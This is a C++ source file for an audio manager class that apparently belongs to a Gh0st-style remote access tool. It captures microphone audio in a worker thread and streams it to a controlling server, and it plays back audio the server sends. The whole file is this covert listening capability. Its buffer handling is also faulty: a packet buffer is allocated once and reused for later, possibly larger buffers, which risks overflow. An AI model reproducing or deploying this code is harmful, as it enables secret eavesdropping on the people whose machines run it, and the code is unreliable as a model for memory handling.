// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "AudioManager.h"
#include "Common.h"
#include <Mmsystem.h>
#include <IOSTREAM>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
	Mprintf("new CAudioManager %p\n", this);

	m_bIsWorking = FALSE;
	m_AudioObject = NULL;

	if (Initialize()==FALSE)
	{
		return;
	}

	BYTE	bToken = TOKEN_AUDIO_START;
	m_ClientObject->Send2Server((char*)&bToken, 1);

	WaitForDialogOpen();    //等待对话框打开
	szPacket = NULL;

	m_hWorkThread = __CreateThread(NULL, 0, WorkThread, (LPVOID)this, 0, NULL);
}


VOID  CAudioManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			if (1 == ulLength)
				NotifyDialogIsOpen();
			break;
		}
	default:
		{
			m_AudioObject->PlayBuffer(szBuffer, ulLength);
			break;
		}
	}
}

DWORD CAudioManager::WorkThread(LPVOID lParam)   //发送声音到服务端
{
	CAudioManager *This = (CAudioManager *)lParam;
	while (This->m_bIsWorking)
	{
		if(!This->SendRecordBuffer())
			Sleep(50);
	}

	Mprintf("CAudioManager WorkThread end\n");

	return 0;
}

BOOL CAudioManager::SendRecordBuffer()
{	
	DWORD	dwBufferSize = 0;
	BOOL	dwReturn = 0;
	//这里得到 音频数据
	LPBYTE	szBuffer = m_AudioObject->GetRecordBuffer(&dwBufferSize);
	if (szBuffer == NULL)
		return 0;
	//分配缓冲区
	szPacket = szPacket ? szPacket : new BYTE[dwBufferSize + 1];
	//加入数据头
	szPacket[0] = TOKEN_AUDIO_DATA;     //向主控端发送该消息
	//复制缓冲区
	memcpy(szPacket + 1, szBuffer, dwBufferSize);
	szPacket[dwBufferSize] = 0;
	//发送出去
	if (dwBufferSize > 0)
	{
		dwReturn = m_ClientObject->Send2Server((char*)szPacket, dwBufferSize + 1);
	}
	return dwReturn;	
}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = FALSE;                            //设定工作状态为假
	WaitForSingleObject(m_hWorkThread, INFINITE);    //等待 工作线程结束
	if (m_hWorkThread)
		CloseHandle(m_hWorkThread);

	if (m_AudioObject!=NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
	if (szPacket)
	{
		delete [] szPacket;
		szPacket = NULL;
	}
	Mprintf("~CAudioManager %p\n", this);
}

//USB  
BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())   //获取波形输入设备的数目  实际就是看看有没有声卡
		return FALSE;

	// SYS    SYS P	
	// 正在使用中.. 防止重复使用
	if (m_bIsWorking==TRUE)
	{
		return FALSE;
	}

	m_AudioObject = new CAudio;  //功能类

	m_bIsWorking = TRUE;
	return TRUE;
}
